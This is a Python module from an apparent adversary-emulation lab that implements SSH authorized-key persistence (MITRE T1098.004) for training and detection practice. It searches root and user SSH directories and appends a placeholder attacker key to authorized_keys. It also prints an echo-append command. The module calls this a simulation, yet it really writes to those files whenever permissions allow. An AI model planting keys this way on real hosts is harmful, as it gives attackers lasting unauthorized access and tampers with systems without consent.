"""
campaigns/persistence/ssh_key_plant.py — T1098.004 SSH Authorized Keys
MITRE ATT&CK: T1098.004 | Tactic: Persistence
"""

import os
import json
import subprocess
from datetime import datetime
from campaigns.base_campaign import BaseCampaign


class SshKeyPlantCampaign(BaseCampaign):
    TECHNIQUE_ID = "T1098.004"
    TECHNIQUE_NAME = "Account Manipulation: SSH Authorized Keys"
    TACTIC = "Persistence"

    # Lab attacker public key (generated for this lab — not a real key)
    LAB_PUBLIC_KEY = (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+LAB-SIMULATION-KEY-NOT-REAL"
        "+adversary-in-a-box-lab-educational-use-only== lab-attacker@adversary-in-a-box"
    )

    def run(self) -> dict:
        self.log_step("init", "Planting SSH authorized key for persistence")
        self.simulate_delay(1)

        # Step 1: Find SSH directories on target
        target_dirs = self._find_ssh_dirs()
        self.log_step("ssh_dir_enum", f"Found SSH dirs: {target_dirs}")
        self.simulate_delay(0.5)

        # Step 2: Plant key (simulated)
        plant_result = self._plant_key(target_dirs)
        self.log_step("key_plant", f"Key plant: {plant_result['status']}", plant_result["status"])

        results = {
            "technique": self.TECHNIQUE_ID,
            "target_dirs": target_dirs,
            "planted_key": self.LAB_PUBLIC_KEY[:80] + "...",
            "result": plant_result,
            "detection": "Monitor ~/.ssh/authorized_keys for unauthorized modifications",
            "timestamp": datetime.utcnow().isoformat(),
        }
        self.save_artifact("ssh_key_plant_results.json", json.dumps(results, indent=2))
        return self.build_result(True, "SSH key persistence demonstrated (simulation)")

    def _find_ssh_dirs(self) -> list:
        dirs = []
        for path in ["/root/.ssh", "/home/victim/.ssh", "/var/www/.ssh"]:
            if os.path.isdir(path):
                dirs.append(path)
        return dirs or ["/home/victim/.ssh (simulated)", "/root/.ssh (simulated)"]

    def _plant_key(self, ssh_dirs: list) -> dict:
        for ssh_dir in ssh_dirs:
            auth_keys = os.path.join(ssh_dir.replace(" (simulated)", ""), "authorized_keys")
            try:
                os.makedirs(os.path.dirname(auth_keys), exist_ok=True)
                with open(auth_keys, "a") as f:
                    f.write(f"\n{self.LAB_PUBLIC_KEY}\n")
                return {"status": "planted", "path": auth_keys}
            except PermissionError:
                pass
            except Exception:
                pass
        return {
            "status": "simulated",
            "note": "Insufficient permissions to write authorized_keys in this context",
            "command": f"echo '{self.LAB_PUBLIC_KEY}' >> ~/.ssh/authorized_keys",
        }
